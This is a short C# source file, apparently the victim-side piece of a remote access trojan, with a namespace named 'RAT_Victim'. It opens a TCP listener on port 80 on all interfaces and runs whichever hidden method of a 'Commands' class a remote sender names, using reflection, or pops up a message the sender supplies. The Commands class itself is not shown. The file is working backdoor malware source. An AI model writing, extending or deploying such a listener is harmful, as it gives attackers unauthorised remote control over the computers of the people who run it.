using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Text;

namespace RAT_Victim
{
    internal static class Program
    {
        public static Socket Client;
        private static readonly Encoding CommandEncoding = Encoding.GetEncoding(1251);

        private static void Main()
        {
            StartServer();
        }

        private static void StartServer()
        {
            var server = new Socket(SocketType.Stream, ProtocolType.Tcp);
            server.Bind(new IPEndPoint(IPAddress.Any, 80));
            server.Listen(0);

            while (true)
            {
                Client = server.Accept();
                var buffer = new byte[64];
                var byteCount = Client.Receive(buffer);
                var command = CommandEncoding.GetString(buffer, 0, byteCount);
                const string prefix = "Message: ";
                if (command.StartsWith(prefix))
                    Commands.ShowMessage(command.Replace(prefix, ""));
                else
                    typeof(Commands).GetMethod(command, BindingFlags.Static | BindingFlags.NonPublic)?.Invoke(null, null);
            }
            // ReSharper disable once FunctionNeverReturns
        }
    }
}
